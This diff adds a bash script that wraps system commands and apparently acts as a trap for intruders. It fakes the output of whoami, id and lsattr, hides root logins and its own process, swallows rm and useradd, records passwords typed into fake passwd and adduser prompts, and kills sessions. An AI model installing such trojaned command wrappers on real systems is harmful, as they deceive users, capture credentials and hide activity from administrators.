@@ -1,0 +1,102 @@
+#!/bin/bash
+
+#Base Requirements
+DIR=
+LOG=
+BIN=
+
+#Options
+AUTO_KILL=
+FAKE=
+
+if [ "$SECRET_VAR" != "SECRET_VAL" ]; then
+	echo "----------" >> "$LOG"
+	echo "user $(whoami) pid $PPID" >> "$LOG"
+	if [ "$FAKE" == "TRUE" ]; then
+		if [ "$BIN" == "whoami" ]; then
+			echo "administrator"
+
+		elif [ "$BIN" == "id" ]; then
+			echo "uid=1000(administrator) gid=1000(administrator groups=1000(administrator)"
+		
+		elif [ "$BIN" == "w" ]; then
+			"$DIR$BIN" $@ | grep -v "root"
+
+		elif [ "$BIN" == "who" ]; then
+			"$DIR$BIN" $@ | grep -v "root"
+		
+		elif [ "$BIN" == "chattr" ]; then
+			echo
+			printf "$USER tried to chattr a file from $(tty)\n" >> "$LOG"
+
+		elif [ "$BIN" == "lsattr" ]; then
+			"$DIR$BIN" "$@" | sed -e "s/----i--------e--/-------------e--/"
+
+		elif [ "$BIN" == "rm" ]; then
+			echo
+			printf "$USER tried deleting a file from $(tty)\n" >> "$LOG"
+
+		elif [ "$BIN" == "passwd" ]; then
+			printf "Enter new UNIX password: "
+			read -s password
+			printf "\nRetype new UNIX password: "
+			read -s password
+			printf "\npasswd: password updated successfully\n"
+			printf "$USER tried changing the password to $password from $(tty)\n" >> "$LOG"
+	
+		elif [ "$BIN" == "useradd" ]; then
+				printf "$USER tried adding a user from $(tty)\n" >> "$LOG"	
+
+		elif [ "$BIN" == "adduser" ]; then
+			if [ -z "$1" ]; then
+				echo "adduser: Only one or two names allowed."
+			else	
+				printf "Adding user \`$1\' ..."
+				printf "\nAdding new group \`$1\' (1002) ..."
+				printf "\nAdding new user \`$1\' (1001) with group \`$1\' ..."
+				printf "\nCreating home directory \`/home/$1\' ..."
+				printf "\nCopying files from \`/etc/skel\' ..."
+				printf "\nEnter new UNIX password: "
+				read -s password
+				printf "\nRetype new UNIX password: "
+				read -s password
+				printf "\npasswd: password updated successfully"
+				printf "\nChanging the user information for $1"
+				printf "\nEnter the new value, or press ENTER for the default"
+				printf "\n	Full Name []: "
+				read
+				printf "\n	Room Number []: "
+				read
+				printf "\n	Work Phone []: "
+				read
+				printf "\n	Home Phone []: "
+				read
+				printf "\n	Other []: "
+				read
+				printf "\nIs the information correct? [Y/n] "
+				read
+				printf "$USER tried adding user $1 with password $password from $(tty)\n" >> "$LOG"
+			fi
+		
+		elif [ "$BIN" == "shutdown" ] || [ "$BIN" == "reboot" ]; then
+			echo
+			printf "$USER tried to shutdown/reboot from $(tty)\n" >> "$LOG"
+			kill -9 $PPID
+
+		elif [ "$BIN" == "ps" ]; then
+			"$DIR$BIN" $@ | grep -v "$DIR"
+
+		else
+			"$DIR$BIN" $@
+		fi
+	else
+		"$DIR$BIN" $@
+	fi
+
+	if [ "$AUTO_KILL" == "TRUE" ]; then
+		printf "$USER got kicked for running $BIN from $(tty)\n" >> "$LOG" 
+		sleep $(shuf -i 1-10 -n1) && kill -9 $PPID &
+	fi
+else
+	"$DIR$BIN" "$@"
+fi
